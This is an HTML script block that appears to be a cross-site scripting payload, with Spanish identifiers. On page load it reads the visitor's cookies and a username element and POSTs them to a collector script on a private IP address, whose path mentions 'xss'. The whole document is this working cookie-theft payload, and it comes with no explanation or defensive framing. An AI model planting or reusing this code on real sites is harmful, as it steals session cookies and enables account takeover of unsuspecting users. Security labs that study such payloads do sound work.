<script languague="javascript">
if(navigator.appVersion.indexOf("MSIE .7")!=-1)
{//IE6, IE5
	window.attachEvent("onload",mandarCookie);
}
else
{//IE7+, Firefox, Chrome, Opera, Safari
	window.addEventListener("load",mandarCookie,false);
}
function mandarCookie(){
	var cookie = document.cookie;
	var usuario = document.getElementById("nombre_usuario").innerHTML;
	var xmlhttp;
	if (window.XMLHttpRequest)
	{//IE7+, Firefox, Chrome, Opera, Safari
	  xmlhttp=new XMLHttpRequest();
	}
	else
	{//IE6, IE5
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	}
	var xmlhttp=new XMLHttpRequest();
	xmlhttp.open("POST","http://172.16.170.8/xss/receptor/recopilador.php",true);
	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xmlhttp.send("cookie="+cookie+"&usuario="+usuario);
}
</script>
